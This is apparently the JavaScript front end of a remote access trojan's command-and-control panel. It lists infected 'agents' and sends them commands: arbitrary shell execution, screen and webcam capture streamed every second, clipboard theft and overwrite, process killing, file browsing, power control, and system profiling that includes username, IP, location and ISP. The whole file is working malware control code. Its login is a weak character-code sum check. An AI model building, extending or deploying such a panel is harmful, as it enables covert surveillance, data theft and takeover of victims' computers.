// Global state
let currentAgent = null;
let agents = [];
let screenStreamInterval = null;
let webcamStreamInterval = null;
let commandCount = 0;
let confirmCallback = null;
let processList = [];
let isAuthenticated = false;

// Authentication
function attemptLogin() {
    const input = document.getElementById('loginPassword');
    const error = document.getElementById('loginError');
    const hash = Array.from(input.value).map(c => c.charCodeAt(0)).reduce((a,b) => a+b, 0);
    
    if (hash === 2089) { // Sum of char codes for the password
        isAuthenticated = true;
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('mainContainer').style.display = 'flex';
        input.value = '';
        error.textContent = '';
        initApp();
    } else {
        error.textContent = 'Invalid password';
        input.value = '';
    }
}

document.getElementById('loginPassword')?.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') attemptLogin();
});

function initApp() {
    initNavigation();
    initTabs();
    initShellInput();
    fetchAgents();
    setInterval(fetchAgents, 5000);
}

// Notification system
function showNotification(message, icon = 'ℹ️') {
    document.getElementById('notifIcon').textContent = icon;
    document.getElementById('notifMessage').textContent = message;
    document.getElementById('notificationModal').classList.add('active');
}

function closeNotification() {
    document.getElementById('notificationModal').classList.remove('active');
}

function showConfirm(message, callback) {
    document.getElementById('confirmMessage').textContent = message;
    document.getElementById('confirmModal').classList.add('active');
    confirmCallback = callback;
}

function confirmAction(result) {
    document.getElementById('confirmModal').classList.remove('active');
    if (confirmCallback) {
        confirmCallback(result);
        confirmCallback = null;
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    // App will init after login
});

// Navigation
function initNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', (e) => {
            e.preventDefault();
            const view = item.dataset.view;
            switchView(view);
            
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');
        });
    });
}

function switchView(viewName) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewName).classList.add('active');
    
    const titles = {
        dashboard: 'Dashboard',
        agents: 'Agents',
        commands: 'Commands',
        logs: 'System Logs'
    };
    document.getElementById('pageTitle').textContent = titles[viewName] || viewName;
}

// Tabs
function initTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const tabName = tab.dataset.tab;
            
            // Stop all streams when switching tabs
            stopScreenStream();
            stopWebcamStream();
            
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            tab.classList.add('active');
            document.getElementById(tabName).classList.add('active');
            
            // Auto-start stream when opening screen/webcam tab
            if (tabName === 'screen') {
                setTimeout(() => startScreenStream(), 500);
            } else if (tabName === 'webcam') {
                setTimeout(() => startWebcamStream(), 500);
            }
        });
    });
}

// Fetch agents
async function fetchAgents() {
    try {
        const res = await fetch('/api/ping');
        const data = await res.json();
        agents = data;
        
        updateDashboard();
        updateAgentsGrid();
        addLog('info', `Fetched ${data.length} agents`);
    } catch (e) {
        console.error('Failed to fetch agents:', e);
        addLog('error', 'Failed to fetch agents');
    }
}

// Update dashboard stats
function updateDashboard() {
    const now = new Date();
    const online = agents.filter(a => (now - new Date(a.last_seen)) < 60000);
    const offline = agents.length - online.length;
    
    document.getElementById('totalAgents').textContent = agents.length;
    document.getElementById('onlineAgents').textContent = online.length;
    document.getElementById('offlineAgents').textContent = offline.length;
    document.getElementById('onlineCount').textContent = online.length;
    document.getElementById('commandsExecuted').textContent = commandCount;
    
    // Update activity
    const activityList = document.getElementById('activityList');
    if (agents.length > 0) {
        activityList.innerHTML = agents.slice(0, 5).map(agent => {
            const isOnline = (now - new Date(agent.last_seen)) < 60000;
            return `
                <div class="activity-item">
                    <span class="activity-time">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    <span class="activity-text">
                        ${agent.hostname} - ${isOnline ? '🟢 Online' : '🔴 Offline'}
                    </span>
                </div>
            `;
        }).join('');
    }
}

// Update agents grid
function updateAgentsGrid() {
    const grid = document.getElementById('agentsGrid');
    const now = new Date();
    
    if (agents.length === 0) {
        grid.innerHTML = '<p class="empty-state">No agents connected</p>';
        return;
    }
    
    grid.innerHTML = agents.map(agent => {
        const isOnline = (now - new Date(agent.last_seen)) < 60000;
        return `
            <div class="agent-card" onclick="openAgentModal('${agent.id}')">
                <div class="agent-header">
                    <h3>${agent.hostname}</h3>
                    <span class="agent-status ${isOnline ? 'online' : 'offline'}">
                        ${isOnline ? '● ONLINE' : '● OFFLINE'}
                    </span>
                </div>
                <div class="agent-info">
                    <div class="agent-info-item">
                        <span class="label">UUID:</span>
                        <span class="value">${agent.id.substring(0, 8)}...</span>
                    </div>
                    <div class="agent-info-item">
                        <span class="label">Last Seen:</span>
                        <span class="value">${new Date(agent.last_seen).toLocaleTimeString()}</span>
                    </div>
                </div>
            </div>
        `;
    }).join('');
}

// Modal functions
function openAgentModal(agentId) {
    const agent = agents.find(a => a.id === agentId);
    if (!agent) return;
    
    currentAgent = agent;
    const now = new Date();
    const isOnline = (now - new Date(agent.last_seen)) < 60000;
    
    document.getElementById('modalAgentName').textContent = agent.hostname;
    document.getElementById('detailId').textContent = agent.id;
    document.getElementById('detailHostname').textContent = agent.hostname;
    document.getElementById('detailStatus').innerHTML = isOnline 
        ? '<span style="color: var(--success)">● ONLINE</span>' 
        : '<span style="color: var(--danger)">● OFFLINE</span>';
    document.getElementById('detailLastSeen').textContent = new Date(agent.last_seen).toLocaleString();
    
    document.getElementById('agentModal').classList.add('active');
    addLog('info', `Opened details for ${agent.hostname}`);
}

function closeModal() {
    document.getElementById('agentModal').classList.remove('active');
    stopScreenStream();
    stopWebcamStream();
    currentAgent = null;
}

// Shell commands
function initShellInput() {
    const input = document.getElementById('shellInput');
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            executeShellCommand();
        }
    });
}

async function executeShellCommand() {
    if (!currentAgent) return;
    
    const input = document.getElementById('shellInput');
    const command = input.value.trim();
    if (!command) return;
    
    const output = document.getElementById('terminalOutput');
    output.innerHTML += `<div class="terminal-line">$ ${command}</div>`;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'shell',
                command: command
            })
        });
        
        const result = await res.json();
        output.innerHTML += `<div class="terminal-line">${result.output || 'Command sent'}</div>`;
        output.scrollTop = output.scrollHeight;
        
        commandCount++;
        addCommandToHistory('shell', command, result.output);
        addLog('success', `Executed: ${command} on ${currentAgent.hostname}`);
    } catch (e) {
        output.innerHTML += `<div class="terminal-line" style="color: #f00;">Error: ${e.message}</div>`;
        addLog('error', `Failed to execute command: ${e.message}`);
    }
    
    input.value = '';
}

// Power commands
async function sendPowerCommand(action) {
    if (!currentAgent) return;
    
    showConfirm(`Are you sure you want to ${action} ${currentAgent.hostname}?`, async (confirmed) => {
        if (!confirmed) return;
        
        try {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'power',
                    action: action
                })
            });
            
            const result = await res.json();
            showNotification(`Power command sent: ${action}`, '⚡');
            commandCount++;
            addCommandToHistory('power', action, 'Command sent');
            addLog('warning', `Power command ${action} sent to ${currentAgent.hostname}`);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
            addLog('error', `Failed to send power command: ${e.message}`);
        }
    });
}

// Screen capture
async function captureScreen() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'screen',
                action: 'capture'
            })
        });
        
        const result = await res.json();
        if (result.status === 'ok') {
            // Command queued, wait for result
            setTimeout(() => checkScreenResult(), 1000);
        }
    } catch (e) {
        console.error('Screen capture error:', e);
    }
}

async function checkScreenResult() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch(`/api/command?agentId=${currentAgent.id}`);
        const commands = await res.json();
        
        // Find completed screen command
        const screenCmd = commands.find(c => c.type === 'screen' && c.status === 'completed' && c.output);
        if (screenCmd && screenCmd.output) {
            const img = document.getElementById('screenImage');
            const placeholder = document.getElementById('screenPlaceholder');
            img.src = screenCmd.output;
            img.classList.add('active');
            placeholder.style.display = 'none';
        }
    } catch (e) {
        console.error('Check result error:', e);
    }
}

function startScreenStream() {
    if (!currentAgent || screenStreamInterval) return;
    
    captureScreen(); // First capture
    screenStreamInterval = setInterval(captureScreen, 1000); // Every 1 second
    addLog('info', `Started screen stream from ${currentAgent.hostname}`);
}

function stopScreenStream() {
    if (screenStreamInterval) {
        clearInterval(screenStreamInterval);
        screenStreamInterval = null;
        addLog('info', 'Stopped screen stream');
    }
}

// Webcam capture
async function captureWebcam() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'webcam',
                action: 'capture'
            })
        });
        
        const result = await res.json();
        if (result.status === 'ok') {
            setTimeout(() => checkWebcamResult(), 1000);
        }
    } catch (e) {
        console.error('Webcam capture error:', e);
    }
}

async function checkWebcamResult() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch(`/api/command?agentId=${currentAgent.id}`);
        const commands = await res.json();
        
        const webcamCmd = commands.find(c => c.type === 'webcam' && c.status === 'completed' && c.output);
        if (webcamCmd && webcamCmd.output) {
            const img = document.getElementById('webcamImage');
            const placeholder = document.getElementById('webcamPlaceholder');
            img.src = webcamCmd.output;
            img.classList.add('active');
            placeholder.style.display = 'none';
        }
    } catch (e) {
        console.error('Check webcam result error:', e);
    }
}

function startWebcamStream() {
    if (!currentAgent || webcamStreamInterval) return;
    
    captureWebcam(); // First capture
    webcamStreamInterval = setInterval(captureWebcam, 1000); // Every 1 second
    addLog('info', `Started webcam stream from ${currentAgent.hostname}`);
}

function stopWebcamStream() {
    if (webcamStreamInterval) {
        clearInterval(webcamStreamInterval);
        webcamStreamInterval = null;
        addLog('info', 'Stopped webcam stream');
    }
}

// Message box
async function sendMessageBox() {
    if (!currentAgent) return;
    
    const title = document.getElementById('msgTitle').value;
    const content = document.getElementById('msgContent').value;
    const type = document.getElementById('msgType').value;
    
    if (!title || !content) {
        showNotification('Please fill in all fields', '⚠️');
        return;
    }
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'message',
                title: title,
                content: content,
                messageType: type
            })
        });
        
        const result = await res.json();
        showNotification('Message sent successfully', '✅');
        commandCount++;
        addCommandToHistory('message', `${title}: ${content}`, 'Message sent');
        addLog('success', `Message sent to ${currentAgent.hostname}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
        addLog('error', `Failed to send message: ${e.message}`);
    }
}

// Command history
function addCommandToHistory(type, command, result) {
    const historyList = document.getElementById('historyList');
    
    if (historyList.querySelector('.empty-state')) {
        historyList.innerHTML = '';
    }
    
    const item = document.createElement('div');
    item.className = 'history-item';
    item.innerHTML = `
        <div class="history-header">
            <span>${currentAgent?.hostname || 'Unknown'}</span>
            <span>${new Date().toLocaleTimeString()}</span>
        </div>
        <div class="history-command">[${type}] ${command}</div>
        <div class="history-result">${result}</div>
    `;
    
    historyList.insertBefore(item, historyList.firstChild);
}

// Logs
function addLog(level, message) {
    const logsContent = document.getElementById('logsContent');
    const time = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${level}`;
    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-message">${message}</span>`;
    
    logsContent.appendChild(entry);
    logsContent.scrollTop = logsContent.scrollHeight;
}

function clearLogs() {
    const logsContent = document.getElementById('logsContent');
    logsContent.innerHTML = '<div class="log-entry info"><span class="log-time">[' + 
        new Date().toLocaleTimeString() + ']</span><span class="log-message">Logs cleared</span></div>';
}

// Search
document.getElementById('searchInput')?.addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase();
    document.querySelectorAll('.agent-card').forEach(card => {
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(query) ? 'block' : 'none';
    });
});

// Close modal on outside click
document.getElementById('agentModal')?.addEventListener('click', (e) => {
    if (e.target.id === 'agentModal') {
        closeModal();
    }
});


// Clipboard Manager
async function refreshClipboard() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'clipboard',
                action: 'get'
            })
        });
        
        setTimeout(async () => {
            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
            const commands = await cmdRes.json();
            const clipCmd = commands.find(c => c.type === 'clipboard' && c.status === 'completed' && c.output);
            
            if (clipCmd) {
                document.getElementById('clipboardContent').value = clipCmd.output;
                addLog('success', 'Clipboard refreshed');
            }
        }, 1500);
        
        addLog('info', 'Refreshing clipboard...');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function setClipboard() {
    if (!currentAgent) return;
    
    const content = document.getElementById('clipboardContent').value;
    if (!content) {
        showNotification('Clipboard content is empty', '⚠️');
        return;
    }
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'clipboard',
                action: 'set',
                content: content
            })
        });
        
        showNotification('Clipboard updated', '✅');
        addLog('success', 'Clipboard set on remote agent');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Task Manager
async function refreshProcesses() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'processes'
            })
        });
        
        setTimeout(async () => {
            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
            const commands = await cmdRes.json();
            const procCmd = commands.find(c => c.type === 'processes' && c.status === 'completed' && c.output);
            
            if (procCmd && procCmd.output) {
                displayProcesses(procCmd.output);
                addLog('success', 'Process list refreshed');
            }
        }, 1500);
        
        addLog('info', 'Refreshing processes...');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

function displayProcesses(data) {
    const processList = document.getElementById('processList');
    const lines = data.split('\\n').filter(line => line.trim() && !line.includes('Running processes'));
    
    if (lines.length === 0) {
        processList.innerHTML = '<p class="empty-state">No processes found</p>';
        return;
    }
    
    processList.innerHTML = lines.map((line, index) => {
        const match = line.match(/(.+?)\s*\(PID:\s*(\d+)\)/);
        if (!match) return '';
        
        const processName = match[1].trim();
        const pid = match[2];
        
        return `
            <div class="process-item">
                <div>
                    <span class="process-name">${processName}</span>
                    <span class="process-pid">PID: ${pid}</span>
                </div>
                <div class="process-actions">
                    <button class="process-btn kill" onclick="killProcess('${processName}', ${pid})">Kill</button>
                    <button class="process-btn restart" onclick="restartProcess('${processName}', ${pid})">Restart</button>
                    <button class="process-btn pause" onclick="suspendProcess(${pid})">Pause</button>
                    <button class="process-btn resume" onclick="resumeProcess(${pid})">Resume</button>
                </div>
            </div>
        `;
    }).join('');
}

async function killProcess(processName, pid) {
    if (!currentAgent) return;
    
    showConfirm(`Kill process: ${processName}?`, async (confirmed) => {
        if (!confirmed) return;
        
        try {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'killprocess',
                    pid: pid
                })
            });
            
            showNotification(`Kill command sent for ${processName}`, '✅');
            addLog('warning', `Kill process: ${processName}`);
            setTimeout(refreshProcesses, 2000);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

async function restartProcess(processName, pid) {
    if (!currentAgent) return;
    
    showConfirm(`Restart process: ${processName}?`, async (confirmed) => {
        if (!confirmed) return;
        
        try {
            const res = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    agentId: currentAgent.id,
                    type: 'restartprocess',
                    pid: pid,
                    name: processName
                })
            });
            
            showNotification(`Restart command sent for ${processName}`, '✅');
            addLog('info', `Restart process: ${processName}`);
            setTimeout(refreshProcesses, 2000);
        } catch (e) {
            showNotification(`Error: ${e.message}`, '❌');
        }
    });
}

async function suspendProcess(pid) {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'suspendprocess',
                pid: pid
            })
        });
        
        showNotification(`Process suspended (PID: ${pid})`, '✅');
        addLog('info', `Suspend process PID: ${pid}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

async function resumeProcess(pid) {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'resumeprocess',
                pid: pid
            })
        });
        
        showNotification(`Process resumed (PID: ${pid})`, '✅');
        addLog('info', `Resume process PID: ${pid}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// Process search
document.getElementById('processSearch')?.addEventListener('input', (e) => {
    const query = e.target.value.toLowerCase();
    document.querySelectorAll('.process-item').forEach(item => {
        const text = item.textContent.toLowerCase();
        item.style.display = text.includes(query) ? 'flex' : 'none';
    });
});


// File Explorer
async function browsePath() {
    if (!currentAgent) return;
    
    const path = document.getElementById('currentPath').value;
    if (!path) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'browse',
                path: path
            })
        });
        
        setTimeout(async () => {
            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
            const commands = await cmdRes.json();
            const browseCmd = commands.find(c => c.type === 'browse' && c.status === 'completed' && c.output);
            
            if (browseCmd && browseCmd.output) {
                displayFiles(browseCmd.output);
                addLog('success', `Browsed: ${path}`);
            }
        }, 1500);
        
        addLog('info', `Browsing: ${path}`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

function displayFiles(data) {
    const fileList = document.getElementById('fileList');
    const lines = data.split('\\n').filter(line => line.trim());
    
    if (lines.length === 0) {
        fileList.innerHTML = '<p class="empty-state">Empty directory</p>';
        return;
    }
    
    fileList.innerHTML = lines.map(line => {
        const isDir = line.startsWith('[DIR]');
        const name = line.replace('[DIR]', '').replace('[FILE]', '').trim();
        const icon = isDir ? '📁' : '📄';
        
        return `
            <div class="file-item" onclick="${isDir ? `navigateToDir('${name}')` : ''}">
                <span class="file-icon">${icon}</span>
                <span class="file-name">${name}</span>
            </div>
        `;
    }).join('');
}

function navigateToDir(dirName) {
    const currentPath = document.getElementById('currentPath');
    let path = currentPath.value;
    if (!path.endsWith('\\')) path += '\\';
    currentPath.value = path + dirName;
    browsePath();
}

function goUpDirectory() {
    const currentPath = document.getElementById('currentPath');
    let path = currentPath.value;
    const parts = path.split('\\').filter(p => p);
    if (parts.length > 1) {
        parts.pop();
        currentPath.value = parts.join('\\') + '\\';
        browsePath();
    }
}

// Text-to-Speech
async function speakText() {
    if (!currentAgent) return;
    
    const text = document.getElementById('ttsText').value;
    const voice = document.getElementById('ttsVoice').value;
    
    if (!text) {
        showNotification('Please enter text to speak', '⚠️');
        return;
    }
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'tts',
                text: text,
                voice: voice
            })
        });
        
        showNotification('TTS command sent', '✅');
        addLog('success', `TTS: ${text.substring(0, 50)}...`);
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

// System Info
async function loadSystemInfo() {
    if (!currentAgent) return;
    
    try {
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: currentAgent.id,
                type: 'sysinfo'
            })
        });
        
        setTimeout(async () => {
            const cmdRes = await fetch(`/api/command?agentId=${currentAgent.id}`);
            const commands = await cmdRes.json();
            const infoCmd = commands.find(c => c.type === 'sysinfo' && c.status === 'completed' && c.output);
            
            if (infoCmd && infoCmd.output) {
                displaySystemInfo(infoCmd.output);
                addLog('success', 'System info loaded');
            }
        }, 2000);
        
        addLog('info', 'Loading system info...');
    } catch (e) {
        showNotification(`Error: ${e.message}`, '❌');
    }
}

function displaySystemInfo(data) {
    const infoGrid = document.getElementById('infoGrid');
    
    try {
        const info = JSON.parse(data);
        
        infoGrid.innerHTML = `
            <div class="info-card">
                <h3>💻 System</h3>
                <div class="info-item">
                    <span class="info-label">OS:</span>
                    <span class="info-value">${info.os || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Architecture:</span>
                    <span class="info-value">${info.arch || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Computer Name:</span>
                    <span class="info-value">${info.hostname || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Username:</span>
                    <span class="info-value">${info.username || 'N/A'}</span>
                </div>
            </div>
            
            <div class="info-card">
                <h3>🖥️ Hardware</h3>
                <div class="info-item">
                    <span class="info-label">CPU:</span>
                    <span class="info-value">${info.cpu || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">RAM:</span>
                    <span class="info-value">${info.ram || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">GPU:</span>
                    <span class="info-value">${info.gpu || 'N/A'}</span>
                </div>
            </div>
            
            <div class="info-card">
                <h3>🌍 Network</h3>
                <div class="info-item">
                    <span class="info-label">IP Address:</span>
                    <span class="info-value">${info.ip || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Location:</span>
                    <span class="info-value">${info.location || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">ISP:</span>
                    <span class="info-value">${info.isp || 'N/A'}</span>
                </div>
            </div>
            
            <div class="info-card">
                <h3>💾 Storage</h3>
                <div class="info-item">
                    <span class="info-label">Total:</span>
                    <span class="info-value">${info.disk_total || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Free:</span>
                    <span class="info-value">${info.disk_free || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Used:</span>
                    <span class="info-value">${info.disk_used || 'N/A'}</span>
                </div>
            </div>
        `;
    } catch (e) {
        infoGrid.innerHTML = '<p class="empty-state">Failed to parse system info</p>';
    }
}

// Auto-load system info when view is opened
function switchView(viewName) {
    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewName).classList.add('active');
    
    const titles = {
        dashboard: 'Dashboard',
        agents: 'Agents',
        commands: 'Commands',
        logs: 'System Logs',
        info: 'System Information'
    };
    document.getElementById('pageTitle').textContent = titles[viewName] || viewName;
    
    if (viewName === 'info' && currentAgent) {
        loadSystemInfo();
    }
}
